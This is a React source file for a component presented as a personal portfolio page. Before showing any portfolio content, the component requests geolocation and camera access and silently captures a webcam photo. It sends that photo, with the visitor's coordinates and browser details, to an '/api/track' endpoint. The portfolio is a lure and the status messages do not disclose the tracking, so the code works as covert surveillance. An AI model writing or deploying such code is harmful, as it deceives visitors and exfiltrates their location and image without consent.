import { useEffect, useState } from "react";
import axios from "axios";

interface PortfolioProps {
  onPermissionsGranted?: () => void;
}

const Portfolio: React.FC<PortfolioProps> = ({ onPermissionsGranted }) => {
  const [granted, setGranted] = useState(false);
  const [message, setMessage] = useState("Requesting permission...");
  const [retry, setRetry] = useState(false);

  const API_URL = import.meta.env.VITE_API_URL;

const requestPermissions = async () => {
  try {
    setMessage("Requesting  access...");
    const location = await new Promise<GeolocationPosition>((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });

    setMessage("Requesting  access...");
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    setMessage("Capturing image...");
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = 320;
    canvas.height = 240;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("Canvas 2D context unavailable");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageBase64 = canvas.toDataURL("image/jpeg");

    const metadata = {
      latitude: location.coords.latitude,
      longitude: location.coords.longitude,
      userAgent: navigator.userAgent,
      screen: {
        width: window.innerWidth,
        height: window.innerHeight,
      },
      language: navigator.language,
      image: imageBase64,
    };

    await axios.post(`${API_URL}/api/track`, metadata);
    stream.getTracks().forEach((track) => track.stop());

    setGranted(true);
    if (onPermissionsGranted) onPermissionsGranted();
  } catch (err) {
    console.error("Permission error:", err);
    setMessage("Permission denied or error. Please allow access.");
    setRetry(true);
  }
};


  useEffect(() => {
    requestPermissions();
  }, []);

  if (!granted) {
    return (
      <div className="min-h-screen flex flex-col gap-4 items-center justify-center bg-black text-white text-center p-4">
        <p className="text-lg">{message}</p>
        {retry && (
          <button
            onClick={() => {
              setRetry(false);
              requestPermissions();
            }}
            className="px-4 py-2 bg-blue-600 rounded text-white text-base hover:bg-blue-700"
          >
            Try Again
          </button>
        )}
      </div>
    );
  }

  return <div>{/* Your Portfolio Components here */}</div>;
};

export default Portfolio;
